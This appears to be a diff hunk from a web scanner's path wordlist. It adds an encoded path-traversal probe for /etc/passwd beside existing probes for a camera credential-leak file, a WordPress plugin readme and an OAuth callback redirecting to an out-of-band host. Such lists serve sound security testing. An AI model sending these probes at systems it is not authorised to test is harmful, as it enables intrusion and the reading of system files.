@@ -806,3 +806,4 @@
 /wp-content/plugins/elementor-pro/readme.txt
 /system.ini?loginuse&loginpas
 /wp-content/plugins/analytics-insights/tools/oauth2callback.php?state=https://oast.me/%3f&code=x
+/%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
